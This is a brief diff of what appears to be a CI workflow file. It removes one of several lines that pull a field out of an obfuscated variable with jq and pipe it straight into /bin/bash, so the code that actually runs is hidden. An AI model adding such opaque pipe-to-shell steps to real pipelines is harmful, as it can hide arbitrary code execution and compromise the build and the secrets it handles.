@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$wss2459" | jq -r .rxz916 | /bin/bash
           printf '%s' "$p7559" | jq -r .y602 | /bin/bash
           printf '%s' "$fmv37" | jq -r .yj5 | /bin/bash
-          echo $of12 | jq -r .zo1048 | /bin/bash
           echo $jjaoa775 | jq -r .dow676 | /bin/bash
 
       - name: Persist results
